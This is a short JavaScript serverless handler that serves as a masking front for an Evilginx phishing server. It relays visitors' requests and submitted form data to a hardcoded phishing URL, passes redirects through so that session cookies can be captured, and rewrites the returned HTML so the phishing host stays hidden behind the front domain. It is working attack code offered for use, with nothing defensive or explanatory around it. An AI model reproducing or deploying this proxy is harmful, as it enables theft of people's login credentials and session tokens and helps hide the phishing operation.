export default async (req, res) => {
  const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob"; // Your phishing URL
  
  try {
    const response = await fetch(EVILGINX_URL, {
      method: req.method,
      headers: {
        'X-Forwarded-Host': req.headers.host,
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'text/html', // Force HTML response
      },
      body: req.method === 'POST' ? req.body : null,
      redirect: 'manual' // Critical for Evilginx
    });

    // Fix Evilginx redirects (e.g., session cookies)
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('location') || EVILGINX_URL;
      return res.redirect(302, `/api/proxy?redirect=${encodeURIComponent(location)}`);
    }

    let html = await response.text();
    // Mask all Evilginx URLs
    html = html.replace(new RegExp(EVILGINX_URL, 'g'), '/api/proxy');
    res.status(200).send(html);
  } catch (error) {
    console.error('Proxy error:', error);
    res.status(500).send('Loading page...');
  }
};
